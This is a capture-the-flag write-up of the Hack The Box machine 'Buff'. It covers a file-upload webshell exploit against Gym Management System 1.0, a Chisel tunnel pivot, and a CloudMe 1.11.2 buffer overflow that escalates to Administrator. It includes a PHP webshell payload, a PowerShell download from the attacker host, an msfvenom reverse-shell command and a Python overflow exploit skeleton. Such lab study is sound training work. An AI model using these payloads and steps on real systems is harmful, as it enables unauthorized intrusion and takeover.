# HTB: Buff

**Difficulty:** Easy
**OS:** Windows
**IP:** 10.129.25.107

Buff is an Easy-difficulty Windows machine featuring an instance of **Gym Management System 1.0**, vulnerable to an unauthenticated remote code execution flaw via file upload. Enumeration of the internal environment reveals a second service, **CloudMe Sync 1.11.2**, running locally on port 8888. Since this service only binds to loopback, we pivot through a Chisel tunnel and exploit a known buffer overflow to escalate straight to Administrator.

---

## Web Enumeration

Browsing to `http://10.129.25.107:8080` presents a gym/fitness-themed website titled "About Fitness," with a login form and navigation for Home, Package, Facilities, About, and Contact. The footer credits **Projectworlds.in**.

![Site landing page](/assets/img/buff/02-site-landing.png)

That footer attribution is the key detail  Projectworlds is a well-known source of student/portfolio-style PHP web applications, several of which have publicly documented vulnerabilities. This narrows our focus toward identifying the exact application and version in use.

### Directory Enumeration

We ran `ffuf` against the target using the DirBuster medium wordlist with a `.php` extension:

![ffuf directory enumeration](/assets/img/buff/03-ffuf-results.png)

The scan returned a large number of soft-404 false positives (the server returns `200` for nonexistent paths), which we filtered out manually. The genuine hits of interest were:

| `register.php` | 200 | Access-restricted on manual visit |

The combination of `upload.php`, `edit.php`, and an `include/` directory pointed toward a specific, well-documented vulnerable PHP application.

## Exploitation  Unauthenticated File Upload RCE

We retrieved and inspected the exploit before running it:

```bash
searchsploit -m php/webapps/48506.py
cat 48506.py
```

The script uploads a crafted PNG file named `kaio-ken.php.png`, containing valid PNG magic bytes followed by an embedded PHP payload:

```php
<?php echo shell_exec($_GET["telepathy"]); ?>
```

Because the server splits the filename on `.` and uses the *second* segment (`php`) as the saved extension, the file is stored server-side as an executable PHP webshell  despite passing the application's `image/png` content-type and extension whitelist checks.

Since the script targets Python 2.7, we prepared a compatible environment:

```bash
sudo apt install python2 -y
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2 get-pip.py
python2 -m pip install requests colorama
```

Then executed the exploit:

```bash
python2 48506.py 'http://10.129.25.107:8080/'
```

![Webshell hostname output](/assets/img/buff/06-webshell-hostname.png)
![Webshell whoami output](/assets/img/buff/07-webshell-whoami.png)

```
C:\xampp\htdocs\gym\upload> hostname

C:\xampp\htdocs\gym\upload> whoami

```

We now had a foothold as the low-privileged user **`buff\shaun`**.

## Pivoting with Chisel

To reach CloudMe's loopback-only listener, we forwarded `127.0.0.1:8888` on the target back to our attacking machine using **Chisel**.

**1. Download a matching Windows Chisel client** (matching our Kali install, v1.11.7):

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.11.7/chisel_1.11.7_windows_amd64.zip
unzip chisel_1.11.7_windows_amd64.zip
```

**2. Serve the binary over HTTP:**

```bash
python3 -m http.server 8000
```

**3. Retrieve it from the target** via PowerShell through our existing webshell access:

```
powershell -c "Invoke-WebRequest -Uri http://10.10.14.237:8000/chisel.exe -OutFile C:\xampp\htdocs\gym\upload\chisel.exe"
```

![Chisel download and setup](/assets/img/buff/11-chisel-setup-a.png)

![Chisel binary transferred to target](/assets/img/buff/11-chisel-setup-b.png)

**4. Start a Chisel server on Kali in reverse mode:**

```bash
chisel server -p 8001 --reverse &
```

**5. Connect from the target and forward port 8888,** detached so it wouldn't hang our GET-based shell:

```
cmd /c start /b C:\xampp\htdocs\gym\upload\chisel.exe client 10.10.14.237:8001 R:8888:127.0.0.1:8888
```

![Chisel server log confirming tunnel established](/assets/img/buff/12-chisel-tunnel-confirmed.png)

```
2026/07/16 12:09:35 server: Reverse tunnelling enabled
2026/07/16 12:09:35 server: Listening on http://0.0.0.0:8001
2026/07/16 12:10:10 server: session#1: Client version (1.11.7) differs from server version (1.11.7-0kali1)
2026/07/16 12:10:10 server: session#1: tun: proxy#R:8888=>8888: Listening
```

We verified end-to-end reachability:

```bash
nc -zv 127.0.0.1 8888
```

Which returned `open`  traffic sent to `127.0.0.1:8888` on Kali was now tunneled through to CloudMe Sync on the target.

## Weaponizing the CloudMe Buffer Overflow

With a public PoC available for CloudMe 1.11.2 (exploit-db 48389, Andy Bowden), we built a working exploit by swapping in a custom reverse shell payload.

**1. Generate reverse shell shellcode**, avoiding known bad characters:

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.237 LPORT=4444 -b '\x00\x0A\x0D' -f python -v payload
```

This produced a 351-byte encoded payload (via `shikata_ga_nai`).

**2. Assemble the final exploit**, preserving the known-working primitives from the original PoC:

- **`padding1`**  1052 bytes of NOP sled to fill the buffer up to the overwrite point
- **`EIP`**  `0x68A842B5`, a `PUSH ESP; RET` gadget in a non-ASLR/non-DEP-protected module, redirecting execution onto our shellcode
- **`NOPS`**  a 30-byte landing zone
- **`payload`**  our custom reverse shell shellcode
- **`overrun`**  padding to bring the total buffer to 1500 bytes

```python
import socket
target = "127.0.0.1"
padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30
payload    = b"..."  # msfvenom-generated shellcode
overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
buf = padding1 + EIP + NOPS + payload + overrun

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 8888))
s.send(buf)
```

**3. Start a listener:**

```bash
nc -lvnp 4444
```

![Netcat listener waiting](/assets/img/buff/13-nc-listener.png)

**4. Trigger the overflow** through the Chisel tunnel:

```bash
python3 buff_exploit.py
```

![Shell caught, whoami confirms Administrator](/assets/img/buff/14-admin-shell.png)

```
C:\Windows\system32>whoami
buff\administrator
```

The overflow executed our shellcode in the context of the CloudMe process, which was running with **Administrator privileges**  escalating us directly from `buff\shaun` to `buff\administrator`.

## Summary

| Stage | Technique |
|---|---|
| Initial Access | Unauthenticated file upload RCE in Gym Management System 1.0 (`upload.php`) via extension whitelist + content-type bypass |
| Foothold | Webshell as `buff\shaun` |
| Privilege Escalation | Local port forward (Chisel) to reach loopback-bound CloudMe Sync 1.11.2, exploited via SEH-based stack buffer overflow (CVE-2018-6892 incomplete fix) |
| Result | Full Administrator access |

**Key takeaways:**
- Client-side file type/extension checks are trivially bypassed when the server trusts filename structure over actual content validation.
- Services bound to `127.0.0.1` are not inherently safe  RCE on the host is sufficient to pivot and reach them via tunneling tools like Chisel.
- Legacy/outdated third-party software (CloudMe Sync) left installed on a box, even for internal/local use, expands the attack surface significantly.
